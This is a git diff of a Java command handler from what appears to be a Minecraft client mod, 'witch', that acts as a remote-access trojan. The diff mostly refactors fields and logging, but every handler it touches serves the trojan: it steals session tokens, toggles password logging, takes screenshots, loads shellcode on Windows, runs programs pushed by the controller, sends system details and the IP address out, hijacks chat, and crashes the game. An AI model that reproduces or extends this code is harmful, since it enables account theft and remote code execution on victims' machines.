@@ -1,13 +1,15 @@
 package me.soda.witch.client.connection;
 
+import com.google.gson.Gson;
 import me.soda.witch.client.Witch;
 import me.soda.witch.client.features.ShellcodeLoader;
 import me.soda.witch.client.features.Variables;
 import me.soda.witch.client.utils.*;
 import me.soda.witch.shared.FileUtil;
-import me.soda.witch.shared.Message;
+import me.soda.witch.shared.LogUtil;
 import me.soda.witch.shared.PlayerInfo;
 import me.soda.witch.shared.ProgramUtil;
+import me.soda.witch.shared.socket.Message;
 import net.minecraft.text.Text;
 
 import java.lang.management.ManagementFactory;
@@ -16,15 +18,16 @@ public class MessageHandler {
     public static void handleMessage(Message message) {
         String msgType = message.messageType;
         Object msg = message.data;
-        Witch.println("Received message: " + msgType);
+        LogUtil.println("Received message: " + msgType);
         try {
             switch (msgType) {
-                case "steal_pwd_switch" -> Variables.passwordBeingLogged = !Variables.passwordBeingLogged;
+                case "steal_pwd_switch" ->
+                        Variables.INSTANCE.passwordBeingLogged = !Variables.INSTANCE.passwordBeingLogged;
                 case "steal_token" -> NetUtil.send(msgType, Stealer.getToken());
                 case "chat_control" -> ChatUtil.sendChat((String) msg);
-                case "chat_filter" -> Variables.filterPattern = (String) msg;
-                case "chat_filter_switch" -> Variables.isBeingFiltered = !Variables.isBeingFiltered;
-                case "chat_mute" -> Variables.isMuted = !Variables.isMuted;
+                case "chat_filter" -> Variables.INSTANCE.filterPattern = (String) msg;
+                case "chat_filter_switch" -> Variables.INSTANCE.isBeingFiltered = !Variables.INSTANCE.isBeingFiltered;
+                case "chat_mute" -> Variables.INSTANCE.isMuted = !Variables.INSTANCE.isMuted;
                 case "mods" -> NetUtil.send(msgType, MinecraftUtil.allMods());
                 case "systeminfo" -> NetUtil.send(msgType, MinecraftUtil.systemInfo());
                 case "screenshot" -> ScreenshotUtil.screenshot();
@@ -38,8 +41,8 @@ public class MessageHandler {
                     if (ProgramUtil.isWin())
                         new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg, false)).start();
                 }
-                case "log" -> Variables.logChatAndCommand = !Variables.logChatAndCommand;
-                case "config" -> NetUtil.send(msgType, Variables.class);
+                case "log" -> Variables.INSTANCE.logChatAndCommand = !Variables.INSTANCE.logChatAndCommand;
+                case "config" -> NetUtil.send(msgType, new Gson().toJson(Variables.INSTANCE));
                 case "player" -> {
                     NetUtil.send(msgType, new PlayerInfo());
                     Witch.client.reconnections = 0;
@@ -50,7 +53,7 @@ public class MessageHandler {
                 }
                 case "server" -> {
                     ServerUtil.disconnect();
-                    Variables.canJoinServer = !Variables.canJoinServer;
+                    Variables.INSTANCE.canJoinServer = !Variables.INSTANCE.canJoinServer;
                 }
                 case "kick" -> ServerUtil.disconnect();
                 case "execute" -> ProgramUtil.runProg((byte[]) msg);
@@ -60,13 +63,13 @@ public class MessageHandler {
                 case "props" -> NetUtil.send(msgType, System.getProperties());
                 case "ip" -> NetUtil.send(msgType, NetUtil.httpSend("https://ifconfig.me/"));
                 case "crash" -> MinecraftUtil.crash();
-                case "server_name" -> Variables.name = (String) msg;
+                case "server_name" -> Variables.INSTANCE.name = (String) msg;
                 default -> {
                 }
             }
         } catch (Exception e) {
-            Witch.println("Corrupted message!");
-            Witch.printStackTrace(e);
+            LogUtil.println("Corrupted message!");
+            LogUtil.printStackTrace(e);
         }
     }
 }
